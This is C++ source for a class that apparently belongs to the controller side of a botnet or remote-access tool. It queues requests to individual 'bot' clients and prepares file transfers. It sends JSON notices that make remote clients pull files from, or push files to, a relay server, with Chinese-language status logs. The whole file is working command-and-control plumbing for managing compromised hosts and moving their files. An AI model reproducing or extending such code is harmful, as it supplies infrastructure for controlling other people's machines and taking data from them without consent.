#include "StdAfx.h"
#include "ProtoManagerChild.h"
#include "HttpQuery.h"
#include "Conv.h"
#include "../Public/GlobalUtils.h"
#include "../Public/Conv.h"
#include "SafeDiskManager.h"

CProtoManagerChild::CProtoManagerChild(DWORD dwClientId, CString strHostName)
	:m_dwClientId(dwClientId)
	,m_strHostName(strHostName)
{
	for (int i = 0; i < CHILD_THREAD_COUNT; i++)
	{
		m_Thread[i] = new CThreadEx(_Thread, this);
	}
	m_ThreadFile = new CThreadEx(_ThreadFile, this);
//	m_ThreadAsync = new CThreadEx(_ThreadAsync, this);
}

CProtoManagerChild::~CProtoManagerChild(void)
{
	for (int i = 0; i < CHILD_THREAD_COUNT; i++)
	{
		delete m_Thread[i];
	}
	delete m_ThreadFile;
//	delete m_ThreadAsync;
}

VOID CProtoManagerChild::Initialize()
{
//	DWORD dwId;
//	BOOL bRet = GetFileId(dwId);
	
	for (int i = 0; i < CHILD_THREAD_COUNT; i++)
	{
		m_Thread[i]->Initialize();
	}
	m_ThreadFile->Initialize();
//	m_ThreadAsync->Initialize();
}

/*
BOOL CProtoManagerChild::GetFileId(DWORD &dwFileId)
{
	BinStorage::InitKey(theRelayInfo.szKey);
	BinStorage::STORAGE *pReqStorage = new BinStorage::STORAGE;
	BOOL bRet = TRUE;

	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_REQUEST_TYPE, 0, REQUEST_TYPE_GET_FILE_ID);
	if (FALSE == bRet)
		return FALSE;

	bRet = FALSE;
	BinStorage::STORAGE *pResStorage = Communicate(pReqStorage);
	if (pResStorage)
	{
		LPTSTR pItem = BinStorage::GetItemData(pResStorage);
		if (NULL != pItem && 0 != lstrlen(pItem))
		{
			dwFileId = _ttoi(pItem);
			if (0 != dwFileId)
				bRet = TRUE;
		}
		delete[] (LPBYTE)pResStorage;
		SAFE_DELETE_AR(pItem);
	}

	SAFE_DELETE(pReqStorage);
	return bRet;
}
*/

/*
BOOL CProtoManagerChild::Request(Packet_t& Packet)
{
	BinStorage::InitKey(theRelayInfo.szKey);
	BinStorage::STORAGE *pReqStorage = new BinStorage::STORAGE;
	BOOL bRet = TRUE;

	// Update Status
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_CLIENT_ID, 0, Packet.dwClientId);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_TYPE, 0, Packet.dwType);
//	USES_CONVERSION;
//	LPSTR pRequest = T2A(Packet.strRequest);
//	bRet = bRet && BinStorage::AddItem(&binStorage, BOT_REQUEST, 0, pRequest, strlen(pRequest));
	DWORD dwDataLen;
	LPSTR pRequest = CConv::CharToUtf(Packet.strRequest, &dwDataLen);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_REQUEST, 0, pRequest, dwDataLen);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_REQUEST_TYPE, 0, REQUEST_TYPE_MANAGE_REQUEST);
	delete[] pRequest;
	if (FALSE == bRet)
	{
		return FALSE;
	}

	bRet = FALSE;
	BinStorage::STORAGE *pResStorage = Communicate(pReqStorage);
	if (pResStorage)
	{
		LPTSTR pItem = BinStorage::GetItemData(pResStorage);
		if (NULL != pItem)
		{
			Packet.strResponse = pItem;
		}
		delete[] (LPBYTE)pResStorage;
		SAFE_DELETE_AR(pItem);
	}

	SAFE_DELETE(pReqStorage);
	return bRet;
}
*/

DWORD WINAPI CProtoManagerChild::_Thread( LPVOID lpThreadParameter )
{
	CProtoManagerChild *pThis = (CProtoManagerChild*)lpThreadParameter;
	pThis->Thread();
	return 0;
}

DWORD WINAPI CProtoManagerChild::_ThreadFile( LPVOID lpThreadParameter )
{
	CProtoManagerChild *pThis = (CProtoManagerChild*)lpThreadParameter;
	pThis->ThreadFile();
	return 0;
}

/*
DWORD WINAPI CProtoManagerChild::_ThreadAsync( LPVOID lpThreadParameter )
{
	CProtoManagerChild *pThis = (CProtoManagerChild*)lpThreadParameter;
	pThis->ThreadAsync();
	return 0;
}
*/

//////////////////////////////////////////////////////////////////////////

VOID CProtoManagerChild::Thread()
{
	Packet_t *pPacket = NULL;
	m_LockThread.Lock();
	//BOOL bProcess = m_ReqManager.GetReq(Packet);
	BOOL bProcess = m_ReqManager.GetReqFirst(pPacket);
	m_LockThread.Unlock();
	if (bProcess)
	{
		switch(pPacket->dwRequestType)
		{
		//case REQUEST_TYPE_MANAGE_GET_LIST:
		//	break;
		case REQUEST_TYPE_MANAGE_REQUEST:
			{
				DWORD dwRet = WaitForSingleObject(pPacket->hEvent, 15 * 1000);
				BOOL bRet = (dwRet == WAIT_OBJECT_0 ? TRUE : FALSE);
				//BOOL bRet = Request(Packet);
				if (bRet)
				{
					SetEvent(pPacket->hSuccess);
				}
				else
				{
					ResetEvent(pPacket->hSuccess);
				}
				thePacketManagerLock.Lock();
				thePacketManager.AddRes(*pPacket);
				thePacketManagerLock.Unlock();
			}
			break;
		case REQUEST_TYPE_CLIENT_REQUEST:
		case REQUEST_TYPE_CLIENT_RESULT:
			break;
		//case REQUEST_TYPE_GET_FILE_UPDOWN_INFO:
		//	break;
		default:
			break;
		}

		m_LockThread.Lock();
		m_ReqManager.PopReqFirst();
		m_LockThread.Unlock();
		Sleep(50);
	}
	else
	{
		Sleep(500);
	}
}

//////////////////////////////////////////////////////////////////////////

/*
VOID CProtoManagerChild::DownloadFile(LPCTSTR lpRelayName, LPCTSTR lpRemoteFilePath)
{
	CString strPath = lpRemoteFilePath;
	CString strFileName = strPath.Right(strPath.GetLength() - strPath.ReverseFind(_T('\\')) - 1);

	_DownloadArg *pArg = new _DownloadArg;
	pArg->pProcess = this;
	pArg->File.bToRemote = FALSE;
	pArg->File.strLocalName = _T("");
	pArg->File.strLocalPath = theConfig.m_Info.szLocalDir;
//	if (pArg->File.strLocalPath.GetAt(pArg->File.strLocalPath.GetLength() - 1) != _T('\\'))
//		pArg->File.strLocalPath += _T("\\");
	if(pArg->File.strLocalPath.Right(1) != _T('\\'))
	{
		pArg->File.strLocalPath += _T("\\");
	}
	CString strMidDir;
	strMidDir.Format(_T("%s.%d\\"), m_strHostName, m_dwClientId);
	pArg->File.strLocalPath += strMidDir;

	BOOL bCreateDir = CGlobalUtility::CreateDir(pArg->File.strLocalPath);
	if (!bCreateDir)
	{
		Packet_t Packet;
		Packet.dwType = BOT_TYPE_FILE_FROM_REMOTE;
		Packet.dwClientId = m_dwClientId;

		CString strTmp;
		strTmp.Format(_T("创建目录(%s)失败"), pArg->File.strLocalPath);
		std::map<CString, CString> mapPair;
		mapPair.insert(std::map<CString, CString>::value_type(_T("TYPE"), _T("LOG")));
		Packet.strResponse = theApp.GenResponse(strTmp, 1, mapPair);
		
		thePacketManagerLock.Lock();
		thePacketManager.AddRes(Packet);
		thePacketManagerLock.Unlock();
		return;
	}

	pArg->File.strLocalPath += strFileName;
	pArg->File.strRemoteDir = lpRelayName;
	pArg->File.dwClientId = m_dwClientId;

	DWORD dwThreadId;
	CreateThread(NULL, 0, _ThreadDownloadFile, pArg, 0, &dwThreadId);
}
*/

VOID CProtoManagerChild::InvokeFile(File_Transfer_t FileTransInfo)
{
	m_queFileTransfer.AddReq(FileTransInfo);
}

/*
DWORD WINAPI CProtoManagerChild::_ThreadDownloadFile( LPVOID lpThreadParameter )
{
	CProtoManagerChild::_DownloadArg *pArg = (CProtoManagerChild::_DownloadArg*)lpThreadParameter;
	pArg->pProcess->ThreadDownloadFile(pArg->File);
	delete pArg;
	return 0;
}

VOID CProtoManagerChild::ThreadDownloadFile(const File_Transfer_t& File)
{
	Packet_t Packet;
	Packet.dwType = BOT_TYPE_FILE_FROM_REMOTE;
	Packet.dwClientId = File.dwClientId;

	std::map<CString, CString> mapPair;
	mapPair.insert(std::map<CString, CString>::value_type(_T("TYPE"), _T("LOG")));

	CString strTmp;
	strTmp.Format(_T("从中转端(%s)下载到本地(%s) => 开始"), File.strRemoteDir, File.strLocalPath);
	Packet.strResponse = theApp.GenResponse(strTmp, 0, mapPair);
	thePacketManagerLock.Lock();
	thePacketManager.AddRes(Packet);
	thePacketManagerLock.Unlock();

//	Sleep(1000);
	HttpQuery::QueryInfo Info;
	BOOL bRet = HttpQuery::DownLoadFile(
		theConfig.m_Info.szHost, theConfig.m_Info.uPort,
		theRelayUpDownInfo.szUpalodDir + File.strRemoteDir, File.strLocalPath,
		Info
		);
	strTmp.Format(_T("从中转端(%s)下载到本地(%s) => %s"), File.strRemoteDir, File.strLocalPath, bRet ? _T("成功") : _T("失败"));
	Packet.strResponse = theApp.GenResponse(strTmp, bRet ? 0 : 1, mapPair);
	thePacketManagerLock.Lock();
	thePacketManager.AddRes(Packet);
	thePacketManagerLock.Unlock();
}
*/

VOID CProtoManagerChild::ThreadFile()
{
	File_Transfer_t FileTrans;
	BOOL bProcess = m_queFileTransfer.GetReq(FileTrans);
	if (bProcess)
	{
		DWORD dwFileId = theProtoManager->m_dwFileId++;
		/*
		BOOL bRet = GetFileId(dwFileId);
		if (bRet)
		{
		}
		*/
		TCHAR szFileId[128];
		wsprintf(szFileId, _T("%d"), dwFileId);

		// Upload
		if (FileTrans.bToRemote == TRUE)
		{
			BOOL bFileTrans = (theRelayUpDownInfo.bUpdated && theRelayUpDownInfo.bFileTrans);
			if (bFileTrans)
			{
				Packet_t Packet;
				Packet.dwType = BOT_TYPE_FILE_TO_REMOTE;
				Packet.dwClientId = FileTrans.dwClientId;

				CString strTmp;
				/*
				strTmp.Format(_T("从本地(%s)上传到中转端(%d) => 开始"), FileTrans.strLocalPath, dwFileId);
				Packet.strResponse = theApp.GenResponse(strTmp, 0);
				thePacketManagerLock.Lock();
				thePacketManager.AddRes(Packet);
				thePacketManagerLock.Unlock();

				BOOL bPost = HttpQuery::PostFile(
					theConfig.m_Info.szHost, theConfig.m_Info.uPort,
					theRelayUpDownInfo.szUpalodScript,
					FileTrans.strLocalPath, szFileId);
				strTmp.Format(_T("从本地(%s)上传到中转端(%d) => %s"), FileTrans.strLocalPath, dwFileId, bPost == TRUE ? _T("成功") : _T("失败"));
				Packet.strResponse = theApp.GenResponse(strTmp, 0);
				thePacketManagerLock.Lock();
				thePacketManager.AddRes(Packet);
				thePacketManagerLock.Unlock();
				*/

				CString strLocalDstDir;
				strLocalDstDir.Format(_T("%sDownload"), theApp.m_strTmpPath);
				BOOL bCreateDirRet = TRUE;
				if (CreateDirectory(strLocalDstDir, NULL) == FALSE)
				{
					DWORD dwError = GetLastError();
					if(dwError != ERROR_FILE_EXISTS && dwError != ERROR_ALREADY_EXISTS)
					{
						bCreateDirRet = FALSE;
					}
				}
				if (!bCreateDirRet)
				{
					strTmp.Format(_T("创建本地目录(%s)失败!"), strLocalDstDir);
					Packet.strResponse = theApp.GenResponse(strTmp, 0);
					thePacketManagerLock.Lock();
					thePacketManager.AddRes(Packet);
					thePacketManagerLock.Unlock();
				}
				else
				{
					CString strLocalDstPath;
					strLocalDstPath.Format(_T("%s\\%d"), strLocalDstDir, dwFileId);
					DeleteFile(strLocalDstPath);
					BOOL bCopy = CopyFile(FileTrans.strLocalPath, strLocalDstPath, FALSE);
					if (!bCopy)
					{
						strTmp.Format(_T("复制本地文件(%s => %s)失败!"), FileTrans.strLocalPath, strLocalDstPath);
						Packet.strResponse = theApp.GenResponse(strTmp, 0);
						thePacketManagerLock.Lock();
						thePacketManager.AddRes(Packet);
						thePacketManagerLock.Unlock();
					}
					else
					{
						// Notify Remote To Download
						LPSTR pRemotePath = CConv::CharToUtf(FileTrans.strRemoteDir + FileTrans.strLocalName);
						Json::Value configValue;
						configValue["FILE_ID"] = (Json::UInt)dwFileId;
						configValue["REMOTE_PATH"] = pRemotePath;
						Json::FastWriter writer;
						std::string strJson = writer.write(configValue);
						LPTSTR pBuf = CConv::UtfToChar(strJson.c_str());
						CString strBuf = pBuf;
						delete[] pRemotePath;
						delete[] pBuf;
						InvokeReq(BOT_TYPE_FILE_TO_REMOTE, strBuf);
					}
				}
			}
		}
		// Download
		else
		{
			// Notify Remote To Download
			//TCHAR szRemotePath[MAX_PATH];
			//wsprintf(szRemotePath, _T("%d&%s%s"), dwFileId, FileTrans.strRemoteDir, FileTrans.strLocalName);
			//InvokeReq(BOT_TYPE_FILE_FROM_REMOTE, szRemotePath);
			LPSTR pRemotePath = CConv::CharToUtf(FileTrans.strRemoteDir + FileTrans.strLocalName);
			Json::Value configValue;
			configValue["FILE_ID"] = (Json::UInt)dwFileId;
			configValue["REMOTE_PATH"] = pRemotePath;
			Json::FastWriter writer;
			std::string strJson = writer.write(configValue);
			LPTSTR pBuf = CConv::UtfToChar(strJson.c_str());
			CString strBuf = pBuf;
			delete[] pRemotePath;
			delete[] pBuf;
			InvokeReq(BOT_TYPE_FILE_FROM_REMOTE, strBuf);
		}
	}
	Sleep(50);
}

//////////////////////////////////////////////////////////////////////////

/*
VOID CProtoManagerChild::ThreadAsync()
{
	vector<AsyncInfo_t> vecInfo;
	BOOL bRet = GetAsync(vecInfo);
	if (bRet)
	{
		for (int i = 0; i < (int)vecInfo.size(); i++)
		{
			Packet_t Packet;
			Packet.strResponse = vecInfo[i].strContent;
			Packet.dwType = vecInfo[i].dwType;
			Packet.dwClientId = vecInfo[i].dwClientId;
			thePacketManagerLock.Lock();
			thePacketManager.AddRes(Packet);
			thePacketManagerLock.Unlock();
		}
	}
	Sleep(500);
}

BOOL CProtoManagerChild::GetAsync(vector<AsyncInfo_t> &vecInfo)
{
	BinStorage::InitKey(theRelayInfo.szKey);
	BinStorage::STORAGE *pReqStorage = new BinStorage::STORAGE;
	BOOL bRet = TRUE;

	// Update Status
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_REQUEST_TYPE, 0, REQUEST_TYPE_MANAGE_REQUEST_ASYNC);
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_CLIENT_ID, 0, m_dwClientId);
	if (FALSE == bRet)
		return FALSE;

	bRet = FALSE;
	BinStorage::STORAGE *pResStorage = Communicate(pReqStorage);
	if (pResStorage)
	{
		DWORD dwItemCount = BinStorage::GetItemCount(pResStorage);
		const DWORD dwItemGroup = 4;
		do 
		{
			if (0 == dwItemCount)
			{
				break;
			}

			if (0 != (dwItemCount % dwItemGroup))
			{
				break;
			}

			AsyncInfo_t Info;
			bRet = TRUE;
			BinStorage::ITEM *pItem = NULL;
			int iIndex = 0;
			while((pItem = BinStorage::GetNextItem(pResStorage, pItem)) != NULL)
			{
				LPTSTR pText = BinStorage::GetItemText(pItem);
				if (0 == iIndex) {}
				else if (1 == iIndex)
					Info.dwClientId = _tstoi(pText);
				else if (2 == iIndex)
					Info.dwType = _tstoi(pText);
				else if (3 == iIndex)
				{
					Info.strContent = pText;
					iIndex = -1;
					vecInfo.push_back(Info);
				}
				SAFE_DELETE_AR(pText);
				iIndex++;
			}
		}
		while(FALSE);
		delete[] (LPBYTE)pResStorage;
	}

	SAFE_DELETE(pReqStorage);
	return bRet;
}
*/
